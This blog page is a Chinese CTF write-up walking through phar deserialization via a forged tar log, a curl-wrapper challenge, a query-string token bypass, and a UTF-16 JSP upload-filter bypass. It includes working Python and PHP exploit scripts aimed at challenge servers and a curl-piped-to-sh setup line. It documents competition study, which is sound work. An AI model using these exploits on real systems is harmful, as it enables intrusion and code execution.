<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Python ljust() 方法返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。 如果指定的长度小于原字符串的长度则返回原字符串。</span><br></pre></td></tr></table></figure>

<p>一下是处理为新数据的过程</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;get_flag.tar&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    new_name = generated_metadata.ljust(<span class="number">100</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()</span><br><span class="line">    new_data = new_name + data[<span class="number">100</span>:]</span><br><span class="line">    checksum = calc_checksum(new_data)</span><br><span class="line">    new_checksum = oct(checksum).rjust(<span class="number">7</span>,<span class="string">&#x27;0&#x27;</span>).encode()+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    new_data = new_name + data[<span class="number">100</span>:<span class="number">148</span>] + new_checksum + data[<span class="number">156</span>:]</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;get_flag.log&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(new_data)</span><br><span class="line">        f.write(<span class="string">b&quot;]\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>生成合法的log文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_checksum</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="keyword">return</span> sum(struct.unpack_from(<span class="string">&quot;148B8x356B&quot;</span>,data))+<span class="number">256</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># generate date and phar content</span></span><br><span class="line">    generated_date = os.popen(<span class="string">&quot;php exp_gen.php&quot;</span>).read().split(<span class="string">&quot;FLAG: &quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    generated_type = <span class="string">&quot;styp979&quot;</span></span><br><span class="line">    generated_metadata = <span class="string">&quot;Time: &quot;</span> + generated_date + <span class="string">&quot; IP: [], REQUEST: [log_type=&quot;</span> + generated_type + <span class="string">&quot;], CONTENT: [&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># make it into phar format</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;get_flag.tar&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    new_name = generated_metadata.ljust(<span class="number">100</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()</span><br><span class="line">    new_data = new_name + data[<span class="number">100</span>:]</span><br><span class="line">    checksum = calc_checksum(new_data)</span><br><span class="line">    new_checksum = oct(checksum).rjust(<span class="number">7</span>,<span class="string">&#x27;0&#x27;</span>).encode()+<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">    new_data = new_name + data[<span class="number">100</span>:<span class="number">148</span>] + new_checksum + data[<span class="number">156</span>:]</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;get_flag.log&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(new_data)</span><br><span class="line">        f.write(<span class="string">b&quot;]\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>将其发送至服务器</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(<span class="string">&quot;Sending exp to the server...&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&quot;get_flag.log&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    requests.post(<span class="string">&quot;http://xx/log.php?log_type=&quot;</span> + generated_type, data=f.read().replace(generated_metadata, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]\n&quot;</span>,<span class="string">&quot;&quot;</span>)).text</span><br><span class="line"></span><br><span class="line"><span class="comment"># getflag</span></span><br><span class="line">print(<span class="string">&quot;Getflag!&quot;</span>)</span><br><span class="line">print(requests.get(<span class="string">&quot;http://xx/index.php?file=phar://log/158.101.144.10/&quot;</span> +generated_type + <span class="string">&quot;_www.log&quot;</span>).text)</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211125222318.png" alt="img" style="zoom:67%;">



<h4 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h4><p>说是坑点，其实也不算吧，就是生成时间戳的那个，在windows系统上不知道为啥执行不来，大概是没权限吧，所以我只能搬到服务器上去执行==，为啥这个时间戳这么重要呢？思考了一下，tar文件数据有比较严格的格式要求，而此时我们是将整个log文件作为一个tar文件，如果我们这个时间戳没有实时更新，那么我们构造以后写入的数据和现在重新生成的时间戳（也就是content前面的内容）拼接以后，就不是一个合法的tar文件格式了，举个例子：就好比，我在A构造好的东西，去了一半去和B构造好的拼接执行，尽管拼接位置一样，但是前后数据不是连贯一致的，所以需要实时更新时间戳才行。</p>
<h3 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h3><p>这里直接N1的题解脚本了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">CLASS</span> <span class="title">FLAG</span> </span>&#123;</span><br><span class="line">    <span class="comment">//private $_flag;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;FLAG: &quot;</span> . <span class="keyword">$this</span>-&gt;_flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ip = <span class="string">&quot;172.17.0.1&quot;</span>;</span><br><span class="line">$log = <span class="string">&#x27;Time: &#x27;</span> . date(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>) . <span class="string">&#x27; IP: [&#x27;</span> . $ip . <span class="string">&#x27;], REQUEST: [], CONTENT: [&#x27;</span>;</span><br><span class="line">$data_len = strlen($log);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="string">&quot;./phar.tar&quot;</span>))&#123;</span><br><span class="line">    $phar = <span class="keyword">new</span> PharData(dirname(<span class="keyword">__FILE__</span>) . <span class="string">&quot;/phar.tar&quot;</span>, <span class="number">0</span>, <span class="string">&quot;phartest&quot;</span>, Phar::TAR);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $o = <span class="keyword">new</span> FLAG();</span><br><span class="line">    $phar-&gt;setMetadata($o);</span><br><span class="line">    $phar-&gt;addFromString($log, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">    file_put_contents(<span class="string">&quot;./phar.tar&quot;</span>, <span class="string">&quot;]\n&quot;</span>, FILE_APPEND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exp = file_get_contents(<span class="string">&quot;./phar.tar&quot;</span>);</span><br><span class="line">$post_exp = substr($exp, $data_len);</span><br><span class="line"><span class="keyword">echo</span> $post_exp;</span><br><span class="line"><span class="keyword">echo</span> rawurlencode($post_exp);</span><br></pre></td></tr></table></figure>

<p>这个是它的内容<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211124231814.png" alt="img" style="zoom:67%;"><br>观察一下tar文件里面的情况<br> 可以发现是文件名为log<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211125142635.png" alt="img" style="zoom:67%;"><br>有点难受，复现到这里，发现环境关掉了，还好给了docker文件，在服务器上试试</p>
<p>接下来发过去即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execCmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    r = os.popen(cmd)</span><br><span class="line">    text = r.read()</span><br><span class="line">    r.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;X-Forwarded-For&quot;</span>: <span class="string">&quot;110.42.133.120&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># write evil log file</span></span><br><span class="line">exp = execCmd(<span class="string">&quot;php exp.php&quot;</span>)</span><br><span class="line">r = requests.post(<span class="string">&quot;http://110.42.133.120:8080/&quot;</span>, unquote(exp), headers=headers)</span><br><span class="line">print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># exp</span></span><br><span class="line">r = requests.get(<span class="string">&quot;http://110.42.133.120:8080/?log_type=test&amp;file=phar://./log/172.17.0.1/look_www.log&quot;</span>)</span><br><span class="line"><span class="comment"># r = requests.get(&quot;http://testabc.com:10082/?log_type=test&amp;file=phar://./log/127.0.0.1/phar.tar&quot;)</span></span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

<h3 id="思路整理"><a href="#思路整理" class="headerlink" title="思路整理"></a>思路整理</h3><p>做这种题确实很爽，感觉思路有在被打开，虽然是看着wp艰难完成的。。。这里梳理一下<br>1.题目很明显需要我们phar反序列化，但是由于写入的文件尾有脏字符，而phar对后四位的签名有规定，所以只能写入tar文件，很巧的是，两者更改后缀都没有影响，判断文件的标准是文件内容的数据，确定使用tar文件进行反序列化后，接下来就是构造数据包</p>
<p>2.了解tar的数据结构，构造出完整正确的tar压缩包传过去即可</p>
<p>思路看似很简单，但其实其中的坑是挺多的，很好！！！</p>
<h2 id="funny-web"><a href="#funny-web" class="headerlink" title="funny_web"></a>funny_web</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">&#x2F;&#x2F;hint in &#x2F;hint.txt</span><br><span class="line">if (!isset($_POST[&quot;url&quot;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function uuid()</span><br><span class="line">&#123;</span><br><span class="line">    $chars &#x3D; md5(uniqid(mt_rand(), true));</span><br><span class="line">    $uuid &#x3D; substr($chars, 0, 8) . &#39;-&#39;</span><br><span class="line">        . substr($chars, 8, 4) . &#39;-&#39;</span><br><span class="line">        . substr($chars, 12, 4) . &#39;-&#39;</span><br><span class="line">        . substr($chars, 16, 4) . &#39;-&#39;</span><br><span class="line">        . substr($chars, 20, 12);</span><br><span class="line">    return $uuid;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Check($url)</span><br><span class="line">&#123;</span><br><span class="line">    $blacklist &#x3D; &quot;&#x2F;l|g|[\x01-\x1f]|[\x7f-\xff]|[&#39;\&quot;]&#x2F;i&quot;;</span><br><span class="line"></span><br><span class="line">    if (is_string($url)</span><br><span class="line">        &amp;&amp; strlen($url) &lt; 4096</span><br><span class="line">        &amp;&amp; !preg_match($blacklist, $url)) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_SESSION[&quot;uuid&quot;])) &#123;</span><br><span class="line">    $_SESSION[&quot;uuid&quot;] &#x3D; uuid();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $_SESSION[&quot;uuid&quot;].&quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if (Check($_POST[&quot;url&quot;])) &#123;</span><br><span class="line">    $url &#x3D; escapeshellarg($_POST[&quot;url&quot;]);</span><br><span class="line">    $cmd &#x3D; &quot;&#x2F;usr&#x2F;bin&#x2F;curl $&#123;url&#125; --output - -m 3 --connect-timeout 3&quot;;</span><br><span class="line">    echo &quot;your command: &quot; . $cmd . &quot;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    $res &#x3D; shell_exec($cmd);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    die(&quot;error~&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (strpos($res, $_SESSION[&quot;uuid&quot;]) !&#x3D;&#x3D; false) &#123;</span><br><span class="line">    echo $res;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;you cannot get the result~&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/16/2021%E6%B7%B1%E8%82%B2%E6%9D%AF/">2021深育杯</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-16</time><div class="content"><h2 id="weblog"><a href="#weblog" class="headerlink" title="weblog"></a>weblog</h2></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/14/2021l3ctf/">2021l3ctf</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-14</time><div class="content"><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>送分题<br>发现password没那么短，双击复制一下，然后urlencode</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="string">&quot;‮⁦L3H⁩⁦password&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="string">&quot;‮⁦CTF⁩⁦l3hctf&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>接下来发送即可</p>
<h2 id="image-service1"><a href="#image-service1" class="headerlink" title="image-service1"></a>image-service1</h2><p>share图片，注册了一下，发现a可以share到b的，然后admin不让注册，也不让share，但是试了一下，发现ADMIN也同样可以share到。。。</p>
<h2 id="image-service2"><a href="#image-service2" class="headerlink" title="image-service2"></a>image-service2</h2><p>看了半天，要想读到flag2就需要更改blur参数还有x，但是直接改的话，会说token不存在，所以觉得还是应该看看参数和uuid的关系是啥样的，正好附件里面有docker文件，起一个docker看看，正好学习一下如何弄这个玩意：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">参考链接：https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;1169085</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">up  安装组下的容器集合默认的yml的文件名称是当前目录下的docker-compose.yml，如果需要指定：</span><br><span class="line">docker-compose -f 文件名 up</span><br><span class="line">docker-compose up -d 后台运行不显示日志pwd</span><br><span class="line">curl -sSL https:&#x2F;&#x2F;get.daocloud.io&#x2F;daotools&#x2F;set_mirror.sh | sh -s http:&#x2F;&#x2F;b81aace9.m.daocloud.io</span><br><span class="line">sudo docker-compose -f docker-compose.yml up </span><br></pre></td></tr></table></figure>

 <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211114195140.png" alt="img" style="zoom:67%;">
需要注意的是，在配置env的时候，需要更改一些参数，踩坑主要也是在loc需要配置为你的服务器ip地址，但是在这里不知道为啥这样也起不了，但是1002的端口可以开启，所以就直接用了，这里确实没想到，其实直接查看docker的日志，看看get那边的值是如何传入的就行了，如何才能做到tooken一致

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211116175752.png" alt="img"></p>
<p>对比一下</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211116175751.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211116180049.png" alt="img"></p>
<p>首先我发了两次blur=20的 发现他们的tooken都是一样的，如下所示，当我更改值以后，他们的tooken就发生改变了，可以看到标黄的那段，那么要如何绕过呢，可以看到他经过了一个map处理，猜想这里的map是对里面的值进行计算然后得到一个tooken，那么如果我们可以做到输入blur:[20]在实际中其实又没有这个值，那就可以绕过了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">image-service-nginx-<span class="number">1</span>    | <span class="number">211.97</span>.<span class="number">128.174</span> - - [<span class="number">16</span>/Nov/<span class="number">2021</span>:<span class="number">09</span>:<span class="number">59</span>:<span class="number">50</span> +<span class="number">0000</span>] <span class="string">&quot;GET /get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200 HTTP/1.1&quot;</span> <span class="number">403</span> <span class="number">25</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | map[blur:[<span class="number">20</span>] text:[secret] textsize:[<span class="number">50</span>] uuid:[<span class="number">4</span>bb2c93b-b18f-<span class="number">42f</span>c-<span class="number">97f</span>c-ec5a3afbab64] x1:[<span class="number">200</span>] y1:[<span class="number">200</span>]]</span><br><span class="line">image-service-service-<span class="number">1</span>  | <span class="comment">//c45fe4fc97e10d46273f8ab3a04233a313e2403e6fdf33bd1b4ab5fd24cc6bf1 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | [GIN] <span class="number">2021</span>/<span class="number">11</span>/<span class="number">16</span> - <span class="number">09</span>:<span class="number">59</span>:<span class="number">50</span> | <span class="number">403</span> |      <span class="number">62.594</span>µs |      <span class="number">172.18</span>.<span class="number">0.2</span> | GET      <span class="string">&quot;/get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">image-service-nginx-<span class="number">1</span>    | <span class="number">211.97</span>.<span class="number">128.174</span> - - [<span class="number">16</span>/Nov/<span class="number">2021</span>:<span class="number">10</span>:<span class="number">05</span>:<span class="number">42</span> +<span class="number">0000</span>] <span class="string">&quot;GET /get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200 HTTP/1.1&quot;</span> <span class="number">403</span> <span class="number">25</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | map[blur:[<span class="number">20</span>] text:[secret] textsize:[<span class="number">50</span>] uuid:[<span class="number">4</span>bb2c93b-b18f-<span class="number">42f</span>c-<span class="number">97f</span>c-ec5a3afbab64] x1:[<span class="number">200</span>] y1:[<span class="number">200</span>]]</span><br><span class="line">image-service-service-<span class="number">1</span>  | <span class="comment">//c45fe4fc97e10d46273f8ab3a04233a313e2403e6fdf33bd1b4ab5fd24cc6bf1 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | [GIN] <span class="number">2021</span>/<span class="number">11</span>/<span class="number">16</span> - <span class="number">10</span>:<span class="number">05</span>:<span class="number">42</span> | <span class="number">403</span> |      <span class="number">65.684</span>µs |      <span class="number">172.18</span>.<span class="number">0.2</span> | GET      <span class="string">&quot;/get?blur=20&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=200&amp;y1=200&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="number">211.97</span>.<span class="number">128.174</span> - - [<span class="number">16</span>/Nov/<span class="number">2021</span>:<span class="number">10</span>:<span class="number">07</span>:<span class="number">26</span> +<span class="number">0000</span>] <span class="string">&quot;GET /get?blur=0&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=0&amp;y1=200 HTTP/1.1&quot;</span> <span class="number">403</span> <span class="number">25</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | map[blur:[<span class="number">0</span>] text:[secret] textsize:[<span class="number">50</span>] uuid:[<span class="number">4</span>bb2c93b-b18f-<span class="number">42f</span>c-<span class="number">97f</span>c-ec5a3afbab64] x1:[<span class="number">0</span>] y1:[<span class="number">200</span>]]</span><br><span class="line">image-service-service-<span class="number">1</span>  | <span class="comment">//6c73f2e8bb98f6d40cc95e9d716a126e2fc6c320322df005cb1532c4a9ff3043 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | [GIN] <span class="number">2021</span>/<span class="number">11</span>/<span class="number">16</span> - <span class="number">10</span>:<span class="number">07</span>:<span class="number">26</span> | <span class="number">403</span> |      <span class="number">94.621</span>µs |      <span class="number">172.18</span>.<span class="number">0.2</span> | GET      <span class="string">&quot;/get?blur=0&amp;text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1=0&amp;y1=200&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="number">211.97</span>.<span class="number">128.174</span> - - [<span class="number">16</span>/Nov/<span class="number">2021</span>:<span class="number">10</span>:<span class="number">14</span>:<span class="number">55</span> +<span class="number">0000</span>] <span class="string">&quot;GET /get?blur:[20]%20text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1:[200]%20y1=200 HTTP/1.1&quot;</span> <span class="number">403</span> <span class="number">25</span> <span class="string">&quot;-&quot;</span> <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0&quot;</span> <span class="string">&quot;-&quot;</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | map[blur:[<span class="number">20</span>] text:[secret] textsize:[<span class="number">50</span>] uuid:[<span class="number">4</span>bb2c93b-b18f-<span class="number">42f</span>c-<span class="number">97f</span>c-ec5a3afbab64] x1:[<span class="number">200</span>] y1:[<span class="number">200</span>]]</span><br><span class="line">image-service-service-<span class="number">1</span>  | <span class="comment">//c45fe4fc97e10d46273f8ab3a04233a313e2403e6fdf33bd1b4ab5fd24cc6bf1 9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907</span></span><br><span class="line">image-service-service-<span class="number">1</span>  | [GIN] <span class="number">2021</span>/<span class="number">11</span>/<span class="number">16</span> - <span class="number">10</span>:<span class="number">14</span>:<span class="number">55</span> | <span class="number">403</span> |      <span class="number">68.117</span>µs |      <span class="number">172.18</span>.<span class="number">0.2</span> | GET      <span class="string">&quot;/get?blur:[20]%20text=secret&amp;textsize=50&amp;token=9d07a8310068f537d7adb22ce4f0beb6d0af32421fd1beeddf7444f959b40907&amp;uuid=4bb2c93b-b18f-42fc-97fc-ec5a3afbab64&amp;x1:[200]%20y1=200&quot;</span></span><br></pre></td></tr></table></figure>

<p>可以看到最终的tooken和一开始输入blur20的是一样的，但是tooken没有发生改变，所以最终的payload是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">get?blur:[20] text&#x3D;secret&amp;textsize&#x3D;50&amp;token&#x3D;61cb06c63c5fb86303c40f4bfd2ea04aa9d7cf3067f8f886c8b30f4e547bc803&amp;uuid&#x3D;1293b342-b144-42ec-983d-96fba7c159b9&amp;x1:[200] y1&#x3D;200</span><br></pre></td></tr></table></figure>

<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>一开始是文件后缀绕过，直接双写就可以了，问题在于后续正则匹配的绕过，这里提到，不能输入两个连续的字符串</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">checkValidChars</span><span class="params">(String content)</span> </span>&#123;</span><br><span class="line">    Pattern pattern = Pattern.compile(<span class="string">&quot;[a-zA-Z0-9]&#123;2,&#125;&quot;</span>);</span><br><span class="line">    Matcher matcher = pattern.matcher(content);</span><br><span class="line">    <span class="keyword">return</span> matcher.find();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一开始是定位这里，看这个getString是否有什么特性，后面是没发现的，只知道他是将其作为string读入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String content = item.getString();</span><br></pre></td></tr></table></figure>

<p>感觉之前的大师傅离成功应该是只有一步之遥了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1.当form中设置method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;时才能正常上传。</span><br><span class="line">2.commons-fileupload上传中如果form中的参数有中文，此时用item.getString()会出现乱码，必须用item.getString(&quot;UTF-8&quot;)，UTF-8为编码方式。</span><br><span class="line"></span><br><span class="line">原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;pg_guo&#x2F;article&#x2F;details&#x2F;8753449</span><br></pre></td></tr></table></figure>

<p>通过测试，我们可以发现，他是没有过滤汉字，那么汉字乱码肯定是可以绕过的，那我们就对文本使用其他编码形式，比如说当utf-16的文本，以utf-8的形式打开，那肯定是会变成乱码的，根据这个思路，就可以绕过了，写一个自动化脚本（已经有大师傅写过了）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_op</span>(<span class="params">filename,filedata</span>):</span></span><br><span class="line">    print(<span class="string">&quot;filename: &quot;</span>,filename)</span><br><span class="line">    print(<span class="string">&quot;filedata: &quot;</span>, filedata)</span><br><span class="line">    <span class="keyword">with</span> open(filename,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(filedata)</span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://123.60.20.221:10001/UploadServlet&#x27;</span>, files=&#123;<span class="string">&quot;filename&quot;</span>: open(filename, <span class="string">&quot;rb&quot;</span>)&#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;文件上传成功! 文件路径: /usr&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        url = <span class="string">&quot;http://123.60.20.221:10001/&quot;</span> + r.text.replace(</span><br><span class="line">            <span class="string">&quot;文件上传成功! 文件路径: /usr/local/apache-tomcat-8.5.72/webapps/ROOT/&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(url)</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        print(r.text)</span><br><span class="line">        print(r.content)</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    filename=<span class="string">&quot;1.jjspsp&quot;</span></span><br><span class="line">    filedata=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">    file_op(filename,filedata)</span><br></pre></td></tr></table></figure>

<p>接下来就是绕过第二个黑名单，里面过滤了很多内容，在寻找绕过方式的时候，看到了很多有意思的方法，决定收藏一下，这里说一下Y4大师傅的解题方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;f5.pm&#x2F;go-61281.html</span><br></pre></td></tr></table></figure>

<p>他的黑名单实在多：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">黑名单Runtime、\u、ScriptEngine、newInstance、ProcessBuilder、invoke、File、defineClass、lookup，JdbcRowSetImpl等</span><br></pre></td></tr></table></figure>

<p>然后再次佩服一下大师傅们，太牛了，这里用到的方法是，使用UrlClassLoader与Class.forName在初始化对象时执行命令，首先学习下这两个包</p>
